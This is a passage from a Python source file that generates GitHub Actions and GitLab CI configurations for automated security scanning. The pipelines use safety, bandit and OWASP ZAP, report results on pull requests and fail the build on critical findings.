jobs:
  security-test:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        pip install safety bandit
    
    - name: Run dependency check
      run: safety check --json > dependency-report.json
      continue-on-error: true
    
    - name: Run static code analysis
      run: bandit -r . -f json -o bandit-report.json
      continue-on-error: true
    
    - name: Set up OWASP ZAP
      run: |
        wget https://github.com/zaproxy/zaproxy/releases/download/v2.13.0/ZAP_2.13.0_Linux.tar.gz
        tar -xvf ZAP_2.13.0_Linux.tar.gz
        cd ZAP_2.13.0
        ./zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true &
    
    - name: Wait for ZAP to start
      run: sleep 30
    
    - name: Run security tests
      run: |
        python -m pytest tests/security/ --json-report --json-report-file=security-test-report.json
      env:
        TARGET_URL: ${{ secrets.STAGING_URL }}
        ZAP_API_KEY: ${{ secrets.ZAP_API_KEY }}
    
    - name: Upload security reports
      uses: actions/upload-artifact@v3
      with:
        name: security-reports
        path: |
          dependency-report.json
          bandit-report.json
          security-test-report.json
    
    - name: Comment PR with results
      if: github.event_name == 'pull_request'
      uses: actions/github-script@v6
      with:
        script: |
          const fs = require('fs');
          
          // Read security test results
          const securityReport = JSON.parse(fs.readFileSync('security-test-report.json', 'utf8'));
          
          // Create comment
          let comment = '## Security Test Results\\n\\n';
          comment += `Total Tests: ${securityReport.summary.total_tests}\\n`;
          comment += `✅ Passed: ${securityReport.summary.passed}\\n`;
          comment += `❌ Failed: ${securityReport.summary.failed}\\n`;
          comment += `⚠️ Warnings: ${securityReport.summary.warnings}\\n\\n`;
          
          if (securityReport.summary.critical_issues > 0) {
            comment += `### 🚨 Critical Issues: ${securityReport.summary.critical_issues}\\n`;
          }
          
          github.rest.issues.createComment({
            issue_number: context.issue.number,
            owner: context.repo.owner,
            repo: context.repo.repo,
            body: comment
          });
    
    - name: Fail if critical issues
      run: |
        if [ $(jq '.summary.critical_issues' security-test-report.json) -gt 0 ]; then
          echo "Critical security issues found!"
          exit 1
        fi
"""
        return workflow
    
    @staticmethod
    def create_gitlab_ci() -> str:
        """Generate GitLab CI configuration for security testing."""
        config = """
stages:
  - test
  - security
  - report

variables:
  PIP_CACHE_DIR: "$CI_PROJECT_DIR/.cache/pip"

cache:
  paths:
    - .cache/pip

security-dependencies:
  stage: security
  image: python:3.10
  script:
    - pip install safety
    - safety check --json > dependency-report.json
  artifacts:
    reports:
      dependency_scanning: dependency-report.json
    paths:
      - dependency-report.json
    expire_in: 1 week
  allow_failure: true

security-sast:
  stage: security
  image: python:3.10
  script:
    - pip install bandit
    - bandit -r . -f json -o sast-report.json
  artifacts:
    reports:
      sast: sast-report.json
    paths:
      - sast-report.json
    expire_in: 1 week
  allow_failure: true

security-integration:
  stage: security
  image: owasp/zap2docker-stable
  services:
    - name: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
      alias: app
  script:
    - |
      zap-baseline.py \\
        -t http://app:8000 \\
        -g gen.conf \\
        -J zap-report.json \\
        -r zap-report.html
  artifacts:
    paths:
      - zap-report.json
      - zap-report.html
    expire_in: 1 week
  allow_failure: true

security-report:
  stage: report
  image: python:3.10
  dependencies:
    - security-dependencies
    - security-sast
    - security-integration
  script:
    - python scripts/generate_security_report.py
  artifacts:
    reports:
      security: consolidated-security-report.json
    paths:
      - security-report.html
    expire_in: 1 month
  when: always
"""
        return config


if __name__ == "__main__":
    # Example usage
    async def main():
        orchestrator = SecurityTestOrchestrator()
        report = await orchestrator.run_full_security_suite("https://api.llmoptimizer.com")
        html_report = orchestrator.generate_html_report(report)
        print(f"Security testing completed. Reports generated: {html_report}")
    
    asyncio.run(main())